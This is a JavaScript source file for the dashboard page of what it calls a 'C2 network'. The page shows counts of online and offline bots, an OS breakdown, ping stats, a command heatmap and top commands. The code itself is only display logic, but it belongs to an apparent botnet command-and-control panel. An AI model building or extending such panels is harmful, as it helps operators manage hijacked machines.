// ============================================================
// 📊 Dashboard Page — Pro Edition (Functional)
// ============================================================
import { getLayout } from "./layout.js";

export function getDashboardPage() {
  const content = `
<div class="page-header">
  <div class="page-title">DASHBOARD</div>
  <div class="page-subtitle">Real-time overview of your C2 network</div>
</div>

<div class="stats-grid">
  <div class="stat-card">
    <div class="stat-label">TOTAL BOTS</div>
    <div class="stat-value" id="statTotal">0</div>
    <div class="stat-change" id="statTotalChange">—</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">ONLINE</div>
    <div class="stat-value green" id="statOnline">0</div>
    <div class="stat-change" id="statOnlineChange">—</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">OFFLINE</div>
    <div class="stat-value red" id="statOffline">0</div>
    <div class="stat-change" id="statOfflineChange">—</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">PINNED</div>
    <div class="stat-value yellow" id="statPinned">0</div>
    <div class="stat-change">favorites</div>
  </div>
</div>

<div class="ticker-wrap">
  <div class="ticker">
    <div class="ticker-item" id="tickerContent">Loading activity...</div>
  </div>
</div>

<div style="display:grid;grid-template-columns:2fr 1fr;gap:20px;margin-bottom:24px;" class="charts-row">
  <div class="card">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
      <div>
        <div style="font-family:var(--font-mono);font-size:14px;font-weight:700;color:var(--text);letter-spacing:1px;">NETWORK TRAFFIC</div>
        <div style="font-family:var(--font-mono);font-size:11px;color:var(--text-dim);margin-top:2px;">Per-bot traffic · real-time</div>
      </div>
      <div style="font-family:var(--font-mono);font-size:11px;color:var(--green);" id="chartLive">● LIVE</div>
    </div>
    <div style="position:relative;height:240px;">
      <canvas id="trafficChart"></canvas>
    </div>
  </div>
  <div class="card">
    <div style="font-family:var(--font-mono);font-size:14px;font-weight:700;color:var(--text);letter-spacing:1px;margin-bottom:20px;">OS BREAKDOWN</div>
    <div id="osBreakdown" style="display:flex;flex-direction:column;gap:12px;">
      <div class="loading">Loading...</div>
    </div>
  </div>
</div>

<div class="card" style="margin-bottom:24px;">
  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
    <div>
      <div style="font-family:var(--font-mono);font-size:14px;font-weight:700;color:var(--text);letter-spacing:1px;">ACTIVITY HEATMAP</div>
      <div style="font-family:var(--font-mono);font-size:11px;color:var(--text-dim);margin-top:2px;">Last 7 days × 24 hours (commands per hour)</div>
    </div>
    <div style="display:flex;gap:4px;font-family:var(--font-mono);font-size:10px;color:var(--text-mute);align-items:center;">
      <span>Less</span>
      <div style="width:12px;height:12px;background:rgba(0,102,255,0.1);border-radius:2px;"></div>
      <div style="width:12px;height:12px;background:rgba(0,102,255,0.3);border-radius:2px;"></div>
      <div style="width:12px;height:12px;background:rgba(0,102,255,0.5);border-radius:2px;"></div>
      <div style="width:12px;height:12px;background:rgba(0,102,255,0.8);border-radius:2px;"></div>
      <div style="width:12px;height:12px;background:rgba(0,255,136,1);border-radius:2px;"></div>
      <span>More</span>
    </div>
  </div>
  <div id="heatmap" style="display:grid;grid-template-columns:repeat(24,1fr);gap:3px;"></div>
  <div style="display:grid;grid-template-columns:repeat(24,1fr);gap:3px;margin-top:6px;font-family:var(--font-mono);font-size:9px;color:var(--text-mute);text-align:center;">
    ${Array.from({length:24},(_, i) => '<div>' + i + '</div>').join('')}
  </div>
</div>

<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px;" class="bottom-row">
  <div class="card">
    <div style="font-family:var(--font-mono);font-size:14px;font-weight:700;color:var(--text);letter-spacing:1px;margin-bottom:20px;">PING STATS</div>
    <div id="pingStats" style="display:flex;flex-direction:column;gap:8px;">
      <div class="loading">Loading...</div>
    </div>
  </div>
  <div class="card">
    <div style="font-family:var(--font-mono);font-size:14px;font-weight:700;color:var(--text);letter-spacing:1px;margin-bottom:20px;">RECENT ACTIVITY</div>
    <div id="recentActivity" style="display:flex;flex-direction:column;gap:6px;max-height:300px;overflow-y:auto;">
      <div class="loading">Loading...</div>
    </div>
  </div>
  <div class="card">
    <div style="font-family:var(--font-mono);font-size:14px;font-weight:700;color:var(--text);letter-spacing:1px;margin-bottom:20px;">TOP COMMANDS</div>
    <div id="topCommands" style="display:flex;flex-direction:column;gap:8px;">
      <div class="loading">Loading...</div>
    </div>
  </div>
</div>

<style>
.ticker-wrap {
  background: linear-gradient(90deg, rgba(0,102,255,0.1), rgba(255,0,64,0.1));
  border: 1px solid var(--border-hi);
  border-radius: 10px;
  padding: 12px 20px;
  margin-bottom: 24px;
  overflow: hidden;
  position: relative;
}
.ticker-wrap::before {
  content: 'LIVE';
  position: absolute;
  top: -1px; left: -1px;
  background: var(--accent-red);
  color: #fff;
  font-family: var(--font-mono);
  font-size: 9px;
  font-weight: 700;
  padding: 2px 8px;
  border-radius: 0 0 6px 0;
  letter-spacing: 1px;
}
.ticker-item {
  font-family: var(--font-mono);
  font-size: 12px;
  color: var(--text-dim);
  padding-left: 50px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.os-item {
  display: flex; align-items: center; gap: 12px;
  padding: 10px; background: var(--bg-2);
  border-radius: 8px; border: 1px solid var(--border);
  transition: all 0.2s;
}
.os-item:hover { border-color: var(--border-hi); }
.os-icon {
  width: 36px; height: 36px; border-radius: 8px;
  display: flex; align-items: center; justify-content: center;
  font-family: var(--font-mono); font-weight: 700; font-size: 14px;
  flex-shrink: 0;
}
.os-info { flex: 1; min-width: 0; }
.os-name {
  font-family: var(--font-mono); font-size: 12px;
  color: var(--text); font-weight: 600; margin-bottom: 4px;
}
.os-bar-bg {
  height: 6px; background: var(--bg-3); border-radius: 3px; overflow: hidden;
}
.os-bar-fill {
  height: 100%; border-radius: 3px;
  transition: width 0.6s cubic-bezier(0.16, 1, 0.3, 1);
}
.os-count {
  font-family: var(--font-mono); font-size: 14px;
  font-weight: 700; color: var(--text); min-width: 30px; text-align: right;
}
.ping-item {
  display: flex; justify-content: space-between; align-items: center;
  padding: 8px 12px; background: var(--bg-2); border-radius: 8px;
  border: 1px solid var(--border); font-family: var(--font-mono); font-size: 11px;
}
.ping-id {
  color: var(--text); font-weight: 600; max-width: 55%;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
.ping-value {
  padding: 3px 8px; border-radius: 4px;
  font-weight: 700; font-size: 10px;
}
.ping-good { background: rgba(0, 255, 136, 0.15); color: var(--green); }
.ping-ok { background: rgba(255, 204, 0, 0.15); color: var(--yellow); }
.ping-mid { background: rgba(255, 102, 0, 0.15); color: var(--orange); }
.ping-bad { background: rgba(255, 0, 64, 0.15); color: var(--accent-red); }
.ping-offline { background: rgba(80, 80, 80, 0.15); color: #505050; }
.activity-item {
  display: flex; gap: 8px; padding: 8px;
  background: var(--bg-2); border-radius: 6px;
  border-left: 3px solid var(--accent-blue);
  font-family: var(--font-mono); font-size: 10px;
  animation: slideIn 0.3s;
}
@keyframes slideIn {
  from { opacity: 0; transform: translateX(-10px); }
  to { opacity: 1; transform: translateX(0); }
}
.activity-item.new-bot { border-left-color: var(--green); }
.activity-item.offline { border-left-color: var(--accent-red); }
.activity-item.online { border-left-color: var(--accent-cyan); }
.activity-time { color: var(--text-mute); font-size: 9px; min-width: 40px; }
.activity-text { color: var(--text-dim); flex: 1; overflow: hidden; text-overflow: ellipsis; }
.tc-item {
  display: flex; justify-content: space-between; align-items: center;
  padding: 8px 12px; background: var(--bg-2); border-radius: 6px;
  border: 1px solid var(--border); font-family: var(--font-mono); font-size: 11px;
}
.tc-name { color: var(--accent-cyan); font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 70%; }
.tc-count {
  background: rgba(0, 102, 255, 0.15); color: var(--accent-blue);
  padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: 700;
}
.heatmap-cell {
  aspect-ratio: 1;
  border-radius: 3px;
  background: rgba(0, 102, 255, 0.05);
  cursor: pointer;
  transition: all 0.2s;
}
.heatmap-cell:hover {
  transform: scale(1.3);
  box-shadow: 0 0 10px currentColor;
}
@media (max-width: 900px) {
  .charts-row, .bottom-row { grid-template-columns: 1fr !important; }
}
</style>

<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<script>
var allBots = [];
var activityLog = [];
var commandCounter = {};
var totalCommands = 0;
var chart = null;
var lastSeenStates = {};
var botColors = {};
var botTraffic = {};
var COLOR_PALETTE = ['#00ff88', '#0066ff', '#ff0040', '#ffaa00', '#a000ff', '#00ffff', '#ff66aa', '#66ff66', '#ff6600', '#6600ff'];

function getBotColor(botId) {
  if (!botColors[botId]) {
    var idx = Object.keys(botColors).length % COLOR_PALETTE.length;
    botColors[botId] = COLOR_PALETTE[idx];
  }
  return botColors[botId];
}

function initChart() {
  var ctx = document.getElementById('trafficChart').getContext('2d');
  chart = new Chart(ctx, {
    type: 'line',
    data: { labels: [], datasets: [] },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      animation: { duration: 300 },
      plugins: {
        legend: {
          display: true,
          position: 'top',
          align: 'end',
          labels: {
            color: '#8888aa',
            font: { family: 'JetBrains Mono', size: 10 },
            boxWidth: 12,
            padding: 8,
          }
        },
        tooltip: {
          backgroundColor: 'rgba(8, 8, 12, 0.95)',
          borderColor: '#0066ff',
          borderWidth: 1,
          titleColor: '#00ff88',
          bodyColor: '#fff',
          titleFont: { family: 'JetBrains Mono', size: 11 },
          bodyFont: { family: 'JetBrains Mono', size: 11 },
          padding: 10,
        }
      },
      scales: {
        x: {
          grid: { color: 'rgba(0, 102, 255, 0.05)', drawBorder: false },
          ticks: { color: '#444466', font: { family: 'JetBrains Mono', size: 9 }, maxTicksLimit: 8 }
        },
        y: {
          beginAtZero: true,
          grid: { color: 'rgba(0, 102, 255, 0.05)', drawBorder: false },
          ticks: { color: '#444466', font: { family: 'JetBrains Mono', size: 9 }, precision: 0 }
        }
      },
      interaction: { intersect: false, mode: 'index' }
    }
  });
}

function updateTrafficChart(bots) {
  if (!chart) return;
  var now = new Date();
  var label = now.getHours().toString().padStart(2, '0') + ':' + 
              now.getMinutes().toString().padStart(2, '0') + ':' +
              now.getSeconds().toString().padStart(2, '0');
  
  for (var i = 0; i < bots.length; i++) {
    var b = bots[i];
    if (!botTraffic[b.id]) {
      botTraffic[b.id] = { labels: [], values: [] };
    }
    botTraffic[b.id].labels.push(label);
    var value = b.isOnline && b.ping ? Math.max(1, 1000 - b.ping) : 0;
    botTraffic[b.id].values.push(value);
    if (botTraffic[b.id].labels.length > 30) {
      botTraffic[b.id].labels.shift();
      botTraffic[b.id].values.shift();
    }
  }
  
  var datasets = [];
  for (var id in botTraffic) {
    var color = getBotColor(id);
    var tr = botTraffic[id];
    datasets.push({
      label: id.length > 15 ? id.substring(0, 13) + '..' : id,
      data: tr.values.slice(),
      borderColor: color,
      backgroundColor: color + '20',
      borderWidth: 2,
      tension: 0.4,
      pointRadius: 0,
      pointHoverRadius: 4,
      fill: false,
    });
  }
  
  chart.data.labels = [];
  if (datasets.length > 0 && datasets[0].data) {
    var firstTr = botTraffic[Object.keys(botTraffic)[0]];
    chart.data.labels = firstTr.labels.slice();
  }
  chart.data.datasets = datasets;
  chart.update('none');
}

async function loadBots() {
  try {
    var res = await fetch('/api/all_bots');
    if (res.status === 401) { window.location.href = '/'; return; }
    var bots = await res.json();
    detectChanges(bots);
    allBots = bots;
    updateStats(bots);
    updateOSBreakdown(bots);
    updatePingStats(bots);
    updateActivity();
    updateTicker(bots);
    updateHeatmap();
    updateTopCommands();
    updateTrafficChart(bots);
  } catch (e) { console.error(e); }
}

function detectChanges(newBots) {
  for (var i = 0; i < newBots.length; i++) {
    var b = newBots[i];
    var prev = lastSeenStates[b.id];
    if (!prev) {
      if (Object.keys(lastSeenStates).length > 0) {
        addActivity('new-bot', '[+] New bot: ' + b.id);
      }
    } else {
      if (prev.isOnline && !b.isOnline) addActivity('offline', '[-] ' + b.id + ' went offline');
      else if (!prev.isOnline && b.isOnline) addActivity('online', '[+] ' + b.id + ' back online');
    }
    lastSeenStates[b.id] = { isOnline: b.isOnline };
  }
}

function addActivity(type, text) {
  activityLog.unshift({ type: type, text: text, time: Date.now() });
  if (activityLog.length > 50) activityLog.pop();
}

function updateStats(bots) {
  var total = bots.length;
  var online = bots.filter(function(b) { return b.isOnline; }).length;
  var offline = total - online;
  var pinned = bots.filter(function(b) { return b.pinned; }).length;

  document.getElementById('statTotal').textContent = total;
  document.getElementById('statOnline').textContent = online;
  document.getElementById('statOffline').textContent = offline;
  document.getElementById('statPinned').textContent = pinned;

  var pct = total > 0 ? Math.round((online / total) * 100) : 0;
  document.getElementById('statOnlineChange').textContent = pct + '% of total';
  document.getElementById('statOfflineChange').textContent = (total > 0 ? (100 - pct) : 0) + '% of total';
}

function updateOSBreakdown(bots) {
  var osCounts = {};
  var osColors = {
    'Windows': { color: '#0066ff', letter: 'W' },
    'Linux': { color: '#ffaa00', letter: 'L' },
    'Mac': { color: '#a000ff', letter: 'M' },
    'Android': { color: '#00ff88', letter: 'A' },
    'Unknown': { color: '#444466', letter: '?' }
  };
  
  bots.forEach(function(b) {
    var os = (b.os || 'Unknown').split(' ')[0];
    if (os.toLowerCase().indexOf('linux') !== -1 || os.toLowerCase().indexOf('kali') !== -1 || os.toLowerCase().indexOf('ubuntu') !== -1) os = 'Linux';
    else if (os.toLowerCase().indexOf('windows') !== -1) os = 'Windows';
    else if (os.toLowerCase().indexOf('mac') !== -1 || os.toLowerCase().indexOf('darwin') !== -1) os = 'Mac';
    else if (os.toLowerCase().indexOf('android') !== -1) os = 'Android';
    else os = os || 'Unknown';
    osCounts[os] = (osCounts[os] || 0) + 1;
  });

  var container = document.getElementById('osBreakdown');
  var total = bots.length || 1;
  var sorted = Object.entries(osCounts).sort(function(a, b) { return b[1] - a[1]; });

  if (sorted.length === 0) {
    container.innerHTML = '<div style="color:var(--text-mute);text-align:center;padding:20px;">No data</div>';
    return;
  }

  container.innerHTML = sorted.map(function(entry) {
    var os = entry[0];
    var count = entry[1];
    var meta = osColors[os] || osColors['Unknown'];
    var pct = Math.round((count / total) * 100);
    return '<div class="os-item">' +
      '<div class="os-icon" style="background:' + meta.color + '20;color:' + meta.color + ';border:1px solid ' + meta.color + ';">' + meta.letter + '</div>' +
      '<div class="os-info">' +
        '<div class="os-name">' + escapeHtml(os) + '</div>' +
        '<div class="os-bar-bg"><div class="os-bar-fill" style="background:' + meta.color + ';width:' + pct + '%;"></div></div>' +
      '</div>' +
      '<div class="os-count">' + count + '</div>' +
    '</div>';
  }).join('');
}

function updatePingStats(bots) {
  var container = document.getElementById('pingStats');
  
  if (bots.length === 0) {
    container.innerHTML = '<div style="color:var(--text-mute);text-align:center;padding:20px;">No bots</div>';
    return;
  }
  
  var sorted = bots.slice().sort(function(a, b) {
    if (a.isOnline && !b.isOnline) return -1;
    if (!a.isOnline && b.isOnline) return 1;
    return (a.ping || 9999) - (b.ping || 9999);
  }).slice(0, 10);
  
  container.innerHTML = sorted.map(function(b) {
    var cls, text;
    if (!b.isOnline) {
      cls = 'ping-offline';
      text = '999ms';
    } else if (b.ping === null || b.ping === undefined) {
      cls = 'ping-offline';
      text = '999ms';
    } else {
      text = b.ping + 'ms';
      if (b.ping < 100) cls = 'ping-good';
      else if (b.ping < 400) cls = 'ping-ok';
      else if (b.ping < 700) cls = 'ping-mid';
      else cls = 'ping-bad';
    }
    return '<div class="ping-item">' +
      '<div class="ping-id">' + escapeHtml(b.id) + '</div>' +
      '<div class="ping-value ' + cls + '">' + text + '</div>' +
    '</div>';
  }).join('');
}

function updateActivity() {
  var container = document.getElementById('recentActivity');
  if (activityLog.length === 0) {
    container.innerHTML = '<div style="color:var(--text-mute);text-align:center;padding:20px;">No activity yet</div>';
    return;
  }
  var now = Date.now();
  container.innerHTML = activityLog.slice(0, 15).map(function(a) {
    var elapsed = Math.floor((now - a.time) / 1000);
    var timeStr = elapsed + 's';
    if (elapsed >= 60) timeStr = Math.floor(elapsed / 60) + 'm';
    if (elapsed >= 3600) timeStr = Math.floor(elapsed / 3600) + 'h';
    return '<div class="activity-item ' + a.type + '">' +
      '<div class="activity-time">' + timeStr + '</div>' +
      '<div class="activity-text">' + escapeHtml(a.text) + '</div>' +
    '</div>';
  }).join('');
}

function updateTicker(bots) {
  var online = bots.filter(function(b) { return b.isOnline; }).length;
  var offline = bots.length - online;
  var text = '● Online: ' + online + ' | ○ Offline: ' + offline + ' | 📡 Total: ' + bots.length + ' | ⚡ Commands: ' + totalCommands;
  document.getElementById('tickerContent').textContent = text;
}

function updateHeatmap() {
  var container = document.getElementById('heatmap');
  var data = JSON.parse(localStorage.getItem('c2_heatmap') || '{}');
  var today = new Date();
  var todayKey = today.toISOString().slice(0, 10);
  var html = '';
  
  for (var h = 0; h < 24; h++) {
    var key = todayKey + '-' + h;
    var count = data[key] || 0;
    var intensity = Math.min(count / 10, 1);
    var color;
    if (count === 0) color = 'rgba(0, 102, 255, 0.05)';
    else if (intensity < 0.25) color = 'rgba(0, 102, 255, 0.3)';
    else if (intensity < 0.5) color = 'rgba(0, 102, 255, 0.5)';
    else if (intensity < 0.75) color = 'rgba(0, 102, 255, 0.7)';
    else color = 'rgba(0, 255, 136, 0.9)';
    
    html += '<div class="heatmap-cell" style="background:' + color + ';color:' + color + ';" title="' + h + ':00 — ' + count + ' commands"></div>';
  }
  container.innerHTML = html;
}

function trackCommand() {
  totalCommands++;
  var now = new Date();
  var key = now.toISOString().slice(0, 10) + '-' + now.getHours();
  var data = JSON.parse(localStorage.getItem('c2_heatmap') || '{}');
  data[key] = (data[key] || 0) + 1;
  localStorage.setItem('c2_heatmap', JSON.stringify(data));
}

function updateTopCommands() {
  var container = document.getElementById('topCommands');
  var sorted = Object.entries(commandCounter).sort(function(a, b) { return b[1] - a[1]; }).slice(0, 10);
  
  if (sorted.length === 0) {
    container.innerHTML = '<div style="color:var(--text-mute);text-align:center;padding:20px;">No commands yet</div>';
    return;
  }
  container.innerHTML = sorted.map(function(entry) {
    return '<div class="tc-item">' +
      '<div class="tc-name">' + escapeHtml(entry[0]) + '</div>' +
      '<div class="tc-count">' + entry[1] + '</div>' +
    '</div>';
  }).join('');
}

window.addEventListener('load', function() {
  initChart();
  loadBots();
  setInterval(loadBots, 3000);
  setInterval(updateActivity, 1000);
});
</script>
`;

  return getLayout("Dashboard", content, "dashboard");
}
